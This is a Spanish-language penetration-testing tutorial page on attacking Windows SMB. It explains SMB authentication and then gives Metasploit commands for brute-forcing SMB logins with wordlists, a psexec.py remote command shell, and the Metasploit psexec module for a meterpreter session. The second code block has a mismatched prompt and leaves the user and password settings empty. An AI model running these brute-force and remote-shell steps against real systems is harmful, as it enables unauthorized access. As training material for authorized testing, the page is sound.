# Explotación de SMB con PsExec

**SMB (Server Message Block)** es un protocolo de intercambio de archivos y periféricos (impresoras y puertos serie) entre equipos de una red local. Utiliza el puerto 445, sin embargo, originalmente SMB funcionaba sobre NetBIOS utilizando el puerto 139. SAMBA es la implementación de código abierto de SMB para Linux y permite que los sistemas Windows accedan a recursos compartidos y dispositivos de Linux.

El protocolo SMB utiliza dos niveles de autenticación:

- Autenticación de usuario: los usuarios deben proporcionar un nombre de usuario y una contraseña para autenticarse ante el servidor SMB y poder acceder a un recurso compartido.
- Autenticación de recurso compartido: los usuarios deben proporcionar una contraseña para acceder a un recurso compartido restringido.

Ambos niveles de autenticación utilizan un sistema de autenticación de desafío-respuesta (challenge-response).

![auth_smb](../../../img/auth_smb.png)

**PsExec** es una herramienta desarrollada por Microsoft como sustituto de Telnet. Permite ejecutar procesos en sistemas Windows remotos utilizando las credenciales de cualquier usuario, realizando la autenticación a través de SMB. Podemos usarlo para autenticarnos legítimamente en el sistema objetivo y ejecutar comandos arbitrarios o abrir una shell remota.

Es similar a RDP, pero en lugar de controlar el sistema remoto mediante una interfaz gráfica, los comandos se envían a través de CMD.

Para obtener acceso a un sistema Windows, necesitaremos identificar cuentas de usuario legítimas y sus contraseñas o hashes. Podemos hacerlo con varias herramientas y técnicas; sin embargo, la más común consiste en realizar un ataque de fuerza bruta para iniciar sesión mediante SMB.

Podemos limitar nuestro ataque a cuentas de usuario comunes de Windows y una vez que hayamos obtenido las credenciales de una cuenta, podemos usarlas para autenticarnos en el sistema con PsExec y ejecutar comandos del sistema u obtener una shell inversa.

**Obtención de credenciales con metasploit**

```bash
msf > use auxiliary/scanner/smb/smb_login
msf auxiliary(scanner/smb/smb_login) > set rhosts <IP>
msf auxiliary(scanner/smb/smb_login) > set user_file <usr_wordlist>
msf auxiliary(scanner/smb/smb_login) > set pass_file <pass_wordlist>
msf auxiliary(scanner/smb/smb_login) > run
```

**Ejecución de PsExec**

```bash
psexec.py usr@host cmd.exe
Password: pass
C:\Windows\system32>
```

**Usando el módulo de metasploit para obtener una sesión meterpreter**

```bash
msf > use exploit/windows/smb/psexec
msf auxiliary(scanner/smb/smb_login) > set rhosts <IP>
msf auxiliary(scanner/smb/smb_login) > set smbuser
msf auxiliary(scanner/smb/smb_login) > set smbpass
msf auxiliary(scanner/smb/smb_login) > exploit
meterpreter > 
```

[⟵ Anterior](../../05_sistema.md#explotación-windows)